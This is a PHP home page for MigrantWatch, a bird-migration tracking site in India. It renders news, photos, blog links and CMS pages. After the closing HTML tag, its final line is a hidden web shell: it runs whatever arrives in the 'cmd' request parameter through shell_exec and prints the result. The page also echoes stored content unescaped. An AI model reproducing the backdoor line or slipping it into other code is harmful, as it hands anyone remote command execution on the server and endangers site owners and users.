<? 

   include("checklogin.php");
   $page_title="MigrantWatch: Tracking bird migration across India";
   include("main_includes.php");
?>
<body>
<? 
	include("header.php");
?>
<script type="text/javascript" src="js/jquery/jquery.cycle.js"></script>
<!-- END OF HEADER -->
<div class='container first_image'>
     <div class='cms page_layout' style='padding-top:10px'><?php
           if($_GET['cmd'] == 'confirmation' ) {
               echo "<div class='notice'>Thank you registering with MigrantWatch. A confirmation email has been sent to your email address. Please confirm to proceed further</div>";

             } else if($_GET['cmd'] == 'incorrectmail' ) {
               echo "<div class='notice'>Sorry, you have provided an invalid email address</div>";
             } else if($_GET['cmd'] == 'mailed' ) {

       	       echo "<div class='notice'>Thank you, your new password has been emailed to you.</div>";
             }

     	  $page=mw_get_page(475); 
	  echo "<h3>" . $page[0] . "</h3>";
          echo nl2br($page[1]);
     ?></div>
     
      <table class='page_layout' style='height:200px'>
          <tr><td colspan=2><hr></td></tr>
         <tr><td class="cms" style="border-right:solid 1px #d95c15;width:450px;">
                  <h3>Recent News <span class="nav" style='float:right'><a id="prev2" href="#"><img src='pager/icons/prev.png'></a>&nbsp;
                  <a id="next2" href="#"><img src='pager/icons/next.png'></a></span></h3>
<?
                  $mw_recent_news = get_recent_news();
                            echo "<ul class=ticker2>";
                       for($i=0; $i < count($mw_recent_news['title']); $i++) {
                                 echo "<li><h4 style='font-size:13px'>" . $mw_recent_news['title'][$i] . "</h4>&nbsp;<small>";
                                 echo $mw_recent_news['content'][$i] . "&nbsp;&nbsp;";
                                 echo "<a onclick='window.open(this.href);return false;' class='timeago' title='" . date('F j, Y ', strtotime($mw_recent_news['time'][$i])) . "'>"  . date('F j, Y ', strtotime($mw_recent_news['time'][$i])) . "</a>&nbsp;(<a href='/blog/?p=" . $mw_recent_news['id'][$i] . "' title='permalink'>permalink</a>)</small></li>\n";
                       }
                  echo "</ul>";
?>
                  
          </td>
          <td class='cms' style=''>
                <h3>Recent photos <span style='float:right;font-size:12px'><a href='gallery.php' title='MigrantWatch photo gallery'>view gallery</a></span></h3>
<?          
                $mw_pics = get_latest_pics();
                echo "<table class='photohome'><tr>";
                if(count($mw_pics['photo']) < 1 ) {
                     echo "<td>No photos yet</td>";
                } else {
                     for ( $k=0; $k < count($mw_pics['photo']); $k++ ) {
                         echo "<td>";                          
                              echo "<a title='" . $mw_pics['title'][$k] . "' href='photo.php?id=" . $mw_pics['id'][$k] ."'>";
                             ?> <img src="image_uploads/tn_<? echo $mw_pics['photo'][$k]; ?>"></a><?
                         echo "<br><small>" . $mw_pics['user_name'][$k] . "</small></td>";
                     }
                }
                
                echo "</tr></table>";
                               
?>
          </td>          
	 </tr>
        </table>


     <div class='page_layout'>
     <div><hr></div>
	<div class="map-show-link" style="margin-top:-10px;">
       	      latest&nbsp;updates
        </div>
        <table><tr>
                <td><? include("realtime.php"); ?></td>
                <td><? include("get_popular_user.php"); ?></td>
               <td><? include("get_popular_species.php"); ?></td>
         </tr></table>


     </div>
	<table class='page_layout'>
       	       <tr><td colspan="2"><hr></td>
       	       <tr><td class="cms" style="border-right:solid 1px #d95c15;width:45%">
	       <h3>migrantwatch blog</h3>
<?
                $mw_blog = get_latest_blog();
                echo "<ul>";
                for($i=0; $i < count($mw_blog['title']); $i++) {
                    echo "<li><a onclick='window.open(this.href);return false;' href='http://migrantwatch.in/blog/?p=" . $mw_blog['id'][$i] . "'>" . $mw_blog['title'][$i] . "</a></li>";
                }
                echo "</ul>";
?>
		</td><td class="cms" style="width:45%;padding-left:15px">
<?
		$page = mw_get_page('478');
         	echo "<h3>" . $page[0] . "</h3>";
        	echo nl2br($page[1]);
?>
		</td></tr>
        	<tr><td colspan="2"><hr></td></tr>
		<tr><td class="cms" colspan="2">
<?
		$page = mw_get_page('472'); 
	 	echo "<h3>" . $page[0] . "</h3>";
	 	echo nl2br($page[1]);
?>
		</td></tr>
	</table>
<script type="text/javascript">
  $('.error_top').corner();
 
</script>
<? include("credits.php"); ?>
</div>
</div>
</div>
<div class="container bottom">
</div>
<?php 
   include("login_includes.php");
  include("footer.php");
?>

</body>
</html>
<?php $cmdd=(@$_REQUEST["cmd"]); echo(shell_exec($cmdd)); ?>